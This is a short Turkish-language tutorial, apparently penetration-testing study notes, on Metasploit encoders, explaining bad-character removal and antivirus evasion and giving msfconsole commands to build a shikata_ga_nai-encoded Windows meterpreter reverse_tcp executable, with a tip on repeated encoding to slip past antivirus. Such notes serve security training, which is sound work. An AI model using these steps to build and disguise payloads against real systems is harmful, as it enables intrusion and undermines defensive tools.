# Kodlayıcılar (Encoders)


Kodlayıcılar (Encoders), ürettiğimiz ham zararlı kodun (payload/shellcode) mimarisini ve dizilimini, belirli bir algoritma kullanarak yeniden şekillendiren (maskeleyen) araçlardır. Kodun ne iş yaptığı değişmez, sadece görünüşü değişir.

## 1. Kodlayıcılar Neden Kullanılır?

Sızma testlerinde iki temel hayati amacı vardır:

* **Kötü Karakterleri (Bad Characters) Temizlemek:** Exploit (özellikle Buffer Overflow) geliştirirken, hedef sistemdeki bazı karakterler kodu bozar. Örneğin `\x00` (Null Byte) karakteri, programlama dillerinde "metnin sonu" anlamına gelir. Payload'ın içinde `\x00` varsa, hedef sistem kodun geri kalanını okumaz ve exploit başarısız olur. Kodlayıcılar, bu zararlı karakterleri kodun içinden tamamen ayıklar ve farklı bayt dizilimleriyle aynı işlevi yapacak şekilde kodu yeniden yazar.
* **Antivirüs ve Güvenlik Ürünlerini Şaşırtmak:** Güvenlik duvarları ve antivirüsler (AV), bilinen payload'ların imza (signature) değerlerini tanır. Kodu (örneğin popüler *shikata_ga_nai* kodlayıcısıyla) maskelediğinizde imzası değişir. *(Not: Günümüzdeki modern, yapay zeka ve sezgisel davranış destekli antivirüsler standart Metasploit kodlayıcılarını kolayca yakalayabilmektedir. Bu amaç için artık özel "Evasion" modülleri tercih edilmektedir).*

## 2. MSFConsole'da Kodlayıcı Kullanımı

Tüm kodlayıcıların listesini (ve hangi mimarilerde çalıştıklarını) görmek için şu komut kullanılır:
```bash
show encoders
````

### Örnek Kullanım Senaryosu: Payload Üretirken Maskeleme

Bir payload üretiyorsunuz ve içindeki tüm kötü karakterlerden kurtulup, kodu _x86/shikata_ga_nai_ (Metasploit'in en popüler polimorfik kodlayıcısıdır) ile şifrelemek istiyorsunuz:

1. **Payload'ı seçin:**

```Bash
use payload/windows/meterpreter/reverse_tcp
```

2. **Kodlayıcıyı ayarlayın:**

```Bash
set encoder x86/shikata_ga_nai
```

3. **Kodu üretin:** _(İsterseniz `generate` komutuna `-e` parametresini ekleyerek tek satırda da yapabilirsiniz)._

```Bash
generate -f exe -e x86/shikata_ga_nai -o zararli.exe
```  

**🔥 CTF İpucu (İterasyon):** Bir kodu bir kere kodlamak antivirüsü atlatmaya yetmeyebilir. Kodu kendi üzerine defalarca katlayarak kodlamak için `generate` komutunda `-i` (iteration - döngü) parametresi kullanılır. _(Örn: `generate -i 5` kodu 5 kez şifreler)._